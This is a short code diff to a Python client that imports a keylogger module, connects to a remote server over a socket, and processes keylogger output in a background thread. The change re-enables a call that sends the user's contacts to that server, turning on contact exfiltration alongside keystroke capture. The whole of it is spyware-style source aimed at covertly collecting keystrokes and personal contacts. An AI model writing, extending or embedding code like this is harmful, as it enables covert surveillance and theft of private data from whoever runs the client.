@@ -15,6 +15,7 @@ from socket import socket, error, AF_INET, SOCK_STREAM
 from constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
 import keylogger
 from protocol import Protocol
+import contacts
 
 
 class Client:
@@ -23,7 +24,10 @@ class Client:
         Constructor method for Client
         """
         try:
-            self.contacts = contacts.Contacts()
+            try:
+                self.contacts = contacts.Contacts()
+            except error as msg:
+                print(msg)
             self.client_socket = socket(AF_INET, SOCK_STREAM)
             self.client_socket.connect((ip, port))
             self.login()
@@ -37,7 +41,7 @@ class Client:
         """
         Sends contacts and starts a thread for handling keylogger output
         """
-        # self.send_contacts()
+        self.send_contacts()
         handle_keylogger_output_thread = threading.Thread(target=self.handle_keylogger_output)
         handle_keylogger_output_thread.start()
 
